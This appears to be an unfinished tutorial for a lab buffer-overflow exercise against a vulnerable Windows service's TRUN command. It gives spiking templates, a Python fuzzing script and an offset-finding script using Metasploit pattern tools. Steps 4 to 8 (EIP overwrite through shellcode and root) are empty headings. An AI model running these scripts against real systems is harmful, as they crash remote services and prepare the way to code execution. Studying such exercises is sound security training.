Open the exe file as admin
Go to Debugger and then File -> Attach and then select the program.

## Step 1: SPIKING (Find vulnerable part of program)

Connect to the vuln application
```bash
nc -nv (ip addr of your windows machine it is running on) (port number): my ip is 10.0.0.52
```
Now throw bunch of charecters in each command and see if any of the commands accepted by the application is vulnerable
TO throw bunch of charecter we use 
```bash
./generic_send_tcp (ip adddr) (port) (some.spk) 
```
some.spk will look like: you can send as many charecter. just try to break the program
```bash
s_readline();
s_string("Some command name to test ");
s_string_variable("0");
```

Look you have to overwrite everything(ESP, EBP) till EIP. EIP will help to get the root access to anything.
************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************

## Step 2: Fuzzing (Send bunch of charecter to break the program)
Use the below python code for a fuzzing script to break the specific command.
```bash
#!/usr/bin/python
import sys, socket
from time import sleep

# Define target IP and port
target_ip = '10.0.0.52'
target_port = 9999

buffer = "A" * 100

while True:
	try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target_ip, target_port))
		
		s.send(('TRUN /.:/' + buffer).encode())
		s.close()
		sleep(1)
		buffer = buffer + "A"*100
		
	except:
		print("Fuzzing crashed at %s bytes" % str(len(buffer)))
		sys.exit()
```
then do
```bash
chmod +x file.py
```
Then run the file

```bash
./file.py
```

************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************
## Step 3: Finding the offset (At what point it breaks)

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l (length from the previous output + some random offset to be safe)
```

Create another python file and use the following code:
```bash
#!/usr/bin/python
import sys, socket

# Define target IP and port
target_ip = '10.0.0.52'
target_port = 9999

offset = "(The value from the previous metasploit command)"

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target_ip, target_port))
	
	s.send(('TRUN /.:/' + offset).encode())
	s.close()
	
except:
	print("Error Connecting to server")
	sys.exit()
```
Make the file executable
```bash
chmod +x file.py
```
Then run the file

```bash
./file.py
```

Copy the Number in front of EIP column in immunity debugger and then use the following command

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q (value in front of EIP)
```


************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************
## Step 4: Overwriting the EIP
************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************
## Step 5: Finding the Bad Charecters
************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************
## Step 6: Finding the right module
************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************
## Step 7: Generating shellcode
************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************
## Step 8: Gain Root
************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************




